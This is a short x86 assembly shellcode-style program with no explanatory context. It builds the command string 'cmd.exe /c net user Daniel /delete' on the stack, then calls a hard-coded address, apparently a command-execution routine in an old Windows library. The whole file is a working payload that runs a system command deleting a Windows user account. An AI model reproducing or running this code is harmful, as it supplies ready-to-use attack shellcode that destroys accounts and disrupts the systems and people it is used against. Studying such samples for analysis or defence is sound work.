BITS 32

global _start
Section .text

_start:

XOR EAX,EAX
PUSH EAX 
PUSH "ete "
PUSH "/del"
PUSH "iel "
PUSH " Dan"
PUSH "user"
PUSH "net "
PUSH " /c "
PUSH "exe "
PUSH "cmd."
MOV EAX,ESP 
PUSH EAX            
MOV EBX,0x7c862b5d   
CALL EBX 
